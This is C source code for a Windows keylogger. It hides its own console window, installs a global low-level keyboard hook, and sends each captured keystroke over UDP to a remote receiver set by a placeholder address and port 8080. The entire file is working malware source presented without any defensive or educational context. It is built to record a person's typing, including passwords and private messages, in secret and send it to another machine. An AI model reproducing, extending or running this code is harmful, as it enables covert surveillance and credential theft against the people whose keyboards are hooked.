#include <winsock2.h>
#include <windows.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define DEFAULT_PORT 8080             // RECEIVER PORT
#define SERVER_ADDR "xxx.xxx.xxx.xxx" // RECEIVER ADDRESS

typedef struct _MYHOOKDATA
{
    int nType;
    HOOKPROC hkprc;
    HHOOK hhook;
} MYHOOKDATA;

MYHOOKDATA kb_hook;
UINT map_key;
BOOL Continue = TRUE;
WSADATA wsaData;
SOCKET SendingSocket;
SOCKADDR_IN ReceiverAddr;
int Ret;

LRESULT WINAPI LowLevelKeyboardProc(int, WPARAM, LPARAM);
void hide_console(void);
void send_UDP(char *buf);
void Init_UDP(WSADATA wsaData, SOCKET s, SOCKADDR_IN r_addr, int ret);

int main(int argc, char **argv)
{
    hide_console();

    time_t now = time(NULL);
    MSG msg;

    // Initialize hooks
    kb_hook.nType = WH_KEYBOARD_LL;
    kb_hook.hkprc = LowLevelKeyboardProc;

    // Install hooks
    kb_hook.hhook = SetWindowsHookEx(kb_hook.nType, kb_hook.hkprc, (HINSTANCE)NULL, 0);

    // Initialize Winsock version 2.2
    if ((Ret = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
    {
        printf("ERROR: WSAStartup failed with error %d\n", Ret);
        return 1;
    }

    // Create a new socket to receive datagrams on.
    if ((SendingSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET)
    {
        printf("ERROR: socket failed with error %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Setup a SOCKADDR_IN structure that will identify the receiver
    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(DEFAULT_PORT);
    ReceiverAddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);

    printf("init UDP successfully\n");
    char *temp = malloc(50);
    sprintf(temp, "Starting record: %s\n", ctime(&now));
    send_UDP(temp);
    free(temp);

    // Message Loop
    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Remove Hook procedure
    if (kb_hook.hhook)
        UnhookWindowsHookEx(kb_hook.hhook);

    // Close the socket and Cleanup
    closesocket(SendingSocket);
    printf("close socket");
    WSACleanup();

    return 1;
}

void send_UDP(char *str)
{
    int len = strlen(str);
    printf("size of buffer: %d\n", len);
    if ((Ret = sendto(SendingSocket, str, len + 1, 0,
                      (SOCKADDR *)&ReceiverAddr, sizeof(ReceiverAddr))) == SOCKET_ERROR)
    {
        printf("ERROR: sendto failed with error %d\n", WSAGetLastError());
        closesocket(SendingSocket);
        WSACleanup();
        return;
    }

    printf("We successfully sent %d byte(s) to %s:%d.\n", Ret,
           inet_ntoa(ReceiverAddr.sin_addr), htons(ReceiverAddr.sin_port));
}

LRESULT WINAPI LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    char *buffer = malloc(12);
    memset(buffer, ' ', 12);

    if (nCode < 0)
        return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);

    if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
    {
        // Map virtual key
        map_key = MapVirtualKeyExW(key->vkCode, MAPVK_VK_TO_CHAR, GetKeyboardLayout(LANG_SYSTEM_DEFAULT));

        // Handle special keys
        switch (map_key)
        {
        case VK_RETURN:
            strcpy(buffer, "[ENTER]");
            break;
        case VK_ESCAPE:
            strcpy(buffer, "[ESC]");
            break;

        case VK_SPACE:
            strcpy(buffer, "[SPACE]");
            break;

        case 0x51:
            PostQuitMessage(0);
        default:
            sprintf(buffer, "%c", map_key);
        }
        printf("buffer content: %s \n", buffer);
        send_UDP(buffer);
    }

    memset(buffer, 0, 12);
    free(buffer);

    return CallNextHookEx(kb_hook.hhook, nCode, wParam, lParam);
}

void hide_console()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}
